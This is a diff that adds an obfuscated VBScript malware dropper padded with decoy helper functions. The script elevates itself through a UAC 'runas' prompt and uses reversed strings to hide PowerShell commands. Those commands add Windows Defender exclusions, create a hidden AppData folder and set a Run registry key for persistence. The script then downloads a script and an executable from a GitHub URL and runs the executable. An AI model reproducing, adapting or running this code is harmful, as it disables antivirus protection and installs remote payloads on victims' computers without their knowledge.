@@ -1,0 +1,106 @@
+Function dwqeqwnassq(s)
+	dwqeqwnassq = Replace(s, "%GGb2", StrReverse("ecneref" + "erPpM-ddA"))
+End Function 
+
+Function dqwe1dasd1(s)
+	dqwe1dasd1 = Replace(s, "%qwe12", StrReverse("tseuqe" + "RbeW-eko" + "vnI"))
+End Function 
+
+Function hh887c1123c(s)
+	hh887c1123c = Replace(s, "%hhj123", "pi" + "ng" + " 127.0.0.1")
+End Function 
+
+Function hjduy8nb123(dw)
+   x = dw+3
+   y = 5+12+dw-7/1
+   ab = x+y / 1124
+   x = ab + 33 / dw
+   hjduy8nb123 = x + y / ab * dw
+End Function
+
+Set objShell = WScript.CreateObject("WScript.Shell")
+
+If WScript.Arguments.length = 0 Then
+   Set objramoSheck = CreateObject("Shell.Application")   
+   objramoSheck.ShellExecute "wscript.exe", Chr(34) & _
+      WScript.ScriptFullName & Chr(34) & " uac", "", "runas", 1
+Else
+   dwqewqnulnya = StrReverse(" c/ e" + "xe.d" + "mc")
+   nubndwyqqaasz = StrReverse(" ex" + "e.lle" + "hsre" + "wop")
+
+   popkmfn1 = StrReverse("sbv.tyads" + "ewqujhh ssecorPnoisulcxE- ecne" + "referPpM-ddA exe.ll" + "ehsrewop")
+   popkmfn2 = StrReverse("sbv.raeabne" + "zorfycnaf sse" + "corPnoisulcxE- ecne" + "referPpM-ddA e" + "xe.llehsrewop")
+   popkmfn3 = StrReverse("exe.esuom" + "rednefed s" + "secorPnoisulcxE- ecner" + "eferPpM-ddA exe." + "llehsrewop")
+   popkmfn4 = StrReverse("\gnimaoR\ataDppA\eliforp" + "metsys\gifnoc\46WOWsyS\swodniW\:C hta" + "PnoisulcxE- ecnereferPpM-ddA ex" + "e.llehsrewop")
+   popkmfn5 = StrReverse("exe.omeev s" + "secorPnoisulcxE- ecne" + "referPpM-ddA exe." + "llehsrewop")
+   popkmfn6 = StrReverse("\gnimaoR\ataDppA\%ELIF" + "ORPRESU% htaPnoisulcxE- ecn" + "ereferPpM-ddA exe." + "llehsrewop")
+   popkmfn6 = StrReverse("zxgydqbbdyuyu\lacoL" + "\ataDppA\%ELIFORPRESU% hta" + "PnoisulcxE- ecner" + "eferPpM-ddA exe.l" + "lehsrewop")
+   popkmfn6 = StrReverse("zxgydqbbdyuyu\lacoL" + "\ataDppA\%ELIFORPRE" + "SU% ridkm")
+   popkmfn7 = StrReverse("ecroF- 'sbv." + "raeabnezorfyc" + "naf\zxgydqbbdyuyu\lacoL\ataDppA\%ELI" + "FORPRESU%' eulaV- 'unqeq" + "bdunkcnh' emaN- nuR\noi" + "sreVtnerruC\swodniW\tfos" + "orciM\ERAWTFOS\:MLKH " + "htaP- ytreporPmetI-w" + "eN exe.llehsrewop")   
+   popkmfn09 = "invo" + "ke-we" + "breq" + "uest -uri https://github.com/krishnatherock9673/krishnamouse9673/raw/main/dropper.dmi -outfile %USERPROFIL" + "E%\AppData\Local\uyuydbbqdyg" + "xz\fancyfr" + "ozenbaear.vbs"
+   popkmfn8 = "invo" + "ke-webreques" + "t -uri https://github.com/krishnatherock9673/krishnamouse9673/raw/main/defendermouse.exe -outfile %USERP" + "ROFILE%\AppData\Local\uyuydbbqdy" + "gxz\veemo.exe;%USERP" + "ROFILE%\AppData\Loc" + "al\uyuydbbqdygx" + "z\veemo.exe"
+
+   objShell.Run dwqewqnulnya + popkmfn1, 5 + 5 + 91 - 51 - 50
+   objShell.Run dwqewqnulnya + popkmfn2, 5 + 5 + 91 - 51 - 50
+   objShell.Run dwqewqnulnya + popkmfn3, 5 + 5 + 91 - 51 - 50
+   objShell.Run dwqewqnulnya + popkmfn4, 5 + 5 + 91 - 51 - 50
+   objShell.Run dwqewqnulnya + popkmfn5, 5 + 5 + 91 - 51 - 50
+   objShell.Run dwqewqnulnya + popkmfn6, 5 + 5 + 91 - 51 - 50
+   objShell.Run dwqewqnulnya + popkmfn7, 5 + 5 + 91 - 51 - 50
+   objShell.Run dwqewqnulnya + nubndwyqqaasz + popkmfn09, 5 + 5 + 91 - 51 - 50
+   objShell.Run dwqewqnulnya + nubndwyqqaasz + popkmfn8, 5 + 5 + 91 - 51 - 50
+   
+   
+End If
+
+Public Sub sddqwweqnnub787h(strSubject, strTo, strFrom, strCC, strBody, arrAttachmentFileNames(), strSmtpServerAddress, intSmtpServerPort)
+    Dim objEmail
+    Set objEmail = CreateObject("CDO.Message")
+    objEmail.Subject = strSubject
+    objEmail.To = strTo
+
+    If Len(Trim(strFrom)) > 0 Then
+        objEmail.From = strFrom
+    End If
+
+    objEmail.CC = strCC
+    objEmail.BodyPart.Charset = "UTF-8"
+    objEmail.Textbody = strBody
+
+
+    On Error Resume Next
+    ' if the array is not initialized, on error resume next will prevent the raise of the error.
+    Dim i
+    For i = LBound(arrAttachmentFileNames) To UBound(arrAttachmentFileNames)
+        objEmail.AddAttachment arrAttachmentFileNames(i)
+    Next
+    On Error Goto 0 ' error handling is turned off again
+End Sub
+
+Private Function GetScriptDirectory()
+    Dim strScriptFullName
+    Dim objFso
+    Dim objFile
+    Dim strDirectoryName
+
+    strScriptFullName = Wscript.ScriptFullName
+    Set objFso = CreateObject("Scripting.FileSystemObject")
+    Set objFile = objFso.GetFile(strScriptFullName)
+    strDirectoryName = objFso.GetParentFolderName(objFile)
+
+    GetScriptDirectory = strDirectoryName
+End Function
+
+Private Function PathCombine(strPath1, strPath2)
+    Dim strResult
+    Dim objFso
+    Set objFso = CreateObject("Scripting.FileSystemObject")
+    strResult = objFso.BuildPath(strPath1, strPath2)
+    PathCombine = strResult
+End Function
+
+Private Sub IncludeFile(strFileName)
+    Dim objFso
+    Set objFso = CreateObject("Scripting.FileSystemObject")
+    ExecuteGlobal objFso.OpenTextFile(strFileName).ReadAll()
+End Sub
